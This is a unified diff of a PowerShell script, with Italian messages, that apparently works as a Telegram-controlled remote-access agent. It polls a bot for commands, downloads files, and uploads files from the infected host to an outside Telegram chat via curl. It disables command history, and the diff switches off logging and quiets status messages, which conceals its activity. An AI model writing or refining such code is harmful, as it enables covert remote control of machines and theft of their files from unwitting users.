@@ -1,25 +1,25 @@
 
-Clear-Host  # Clear the shell
-Set-PSReadlineOption    -HistorySaveStyle   SaveNothing
-Set-Location            -Path               $env:USERPROFILE
+Clear-Host
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+Set-Location -Path $env:USERPROFILE
 
-$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id                = "@ID"
-$api_token                  = "@TOKEN"
-$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $api_token
-$api_get_messages           = 'https://api.telegram.org/bot{0}/SendMessage'                 -f $api_token
-$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $api_token
-$api_download_file          = 'https://api.telegram.org/file/bot{0}/'                       -f $api_token
-$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}'    -f $api_token, $telegram_id
-$logs                       = $true
-$Global:ProgressPreference  = 'SilentlyContinue'
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$telegram_id = "@ID"
+$api_token = "@TOKEN"
+$api_get_updates = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
+$api_get_messages = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
+$api_get_file = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
+$api_download_file = 'https://api.telegram.org/file/bot{0}/' -f $api_token
+$api_upload_file = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
+$logs = $false
+$Global:ProgressPreference = 'SilentlyContinue'
 
 
 function Log($string)
 {
     if ($logs) {
         Write-Host -ForegroundColor Yellow -BackgroundColor Black ("+ [" + (get-date).ToString() + "] " + $string)
-        Start-Sleep -Milliseconds 100
+        Start-Sleep -Milliseconds 50
     }
 }
 
@@ -60,9 +60,9 @@ function SendDocument($filePath)
     SendMessage "Procedo ad inviare il file [$($filePath)]"
     if (Test-Path -Path $filePath -PathType Leaf) {
         try {
-            SendMessage "Invio del file in corso"
+            Log "Invio del file in corso"
             curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null
-            SendMessage "File inviato con successo"
+            Log "File inviato con successo"
         } catch {
             SendMessage "Errore durante l'upload del file: [$($Error[0])]"
         }
@@ -76,11 +76,9 @@ function SendMessage ($output)
     Log "Procedo ad inviare il messaggio"
 
     $MessageToSend = New-Object psobject
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $telegram_id
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $false
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + "[HOST ($hostia)]`n" + $output + "</pre>")
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $telegram_id
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode' -Value "html"
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value ("<pre>" + "[HOST ($hostia)]`n" + $output + "</pre>")
     $MessageToSend = $MessageToSend | ConvertTo-Json
 
     try {
